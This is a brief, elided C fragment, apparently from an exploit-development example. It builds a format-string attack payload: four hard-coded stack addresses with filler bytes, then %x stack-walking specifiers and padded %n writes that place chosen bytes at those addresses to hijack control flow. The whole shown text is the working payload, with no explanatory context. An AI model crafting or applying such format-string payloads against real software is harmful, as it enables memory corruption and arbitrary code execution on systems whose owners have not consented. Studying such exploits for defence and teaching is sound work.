...
int main(void)
{
  ...
  strncpy(buf, "\x3c\xfe\xff\xbf\x01\x01\x01\x01\x3d\xfe\xff\xbf\x01\x01\x01\x01\x3e\xfe\xff\xbf\x01\x01\x01\x01"
      "\x3f\xfe\xff\xbf%08x%08x%244x%n%220x%n%259x%n%192x%n", 52);
